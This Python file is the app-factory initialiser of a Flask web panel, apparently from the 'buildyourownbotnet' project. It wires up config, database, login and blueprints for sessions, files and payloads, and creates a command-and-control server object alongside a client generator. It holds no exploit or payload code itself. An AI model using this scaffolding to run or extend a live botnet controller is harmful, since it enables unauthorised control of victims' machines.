import os
from flask import Flask

# import configs
from buildyourownbotnet.config import ProdConfig, TestConfig

# login manager
from flask_login import LoginManager

# import models and create tables in database
login_manager = LoginManager()
login_manager.login_view = 'users.login'
login_manager.login_message_category = 'info'

# server and client generator
from buildyourownbotnet import client, server
c2 = server.C2()

def create_app(test=False):
    # initialize app and configure global objects
    app = Flask(__name__,
                static_url_path='/assets', 
                static_folder='assets',
                template_folder='templates')

    # configure app
    config = ProdConfig if not test else TestConfig
    app.config.from_object(config)

    from buildyourownbotnet.models import db, bcrypt
    db.init_app(app)
    with app.app_context():
        db.create_all()
    bcrypt.init_app(app)
    login_manager.init_app(app)

    # import blueprints
    from buildyourownbotnet.main.routes import main
    from buildyourownbotnet.users.routes import users
    from buildyourownbotnet.api.files.routes import files
    from buildyourownbotnet.api.session.routes import session
    from buildyourownbotnet.api.payload.routes import payload
    from buildyourownbotnet.errors.handlers import errors

    # register blueprints
    app.register_blueprint(main)
    app.register_blueprint(users)
    app.register_blueprint(files)
    app.register_blueprint(session)
    app.register_blueprint(payload)
    app.register_blueprint(errors)

    return app
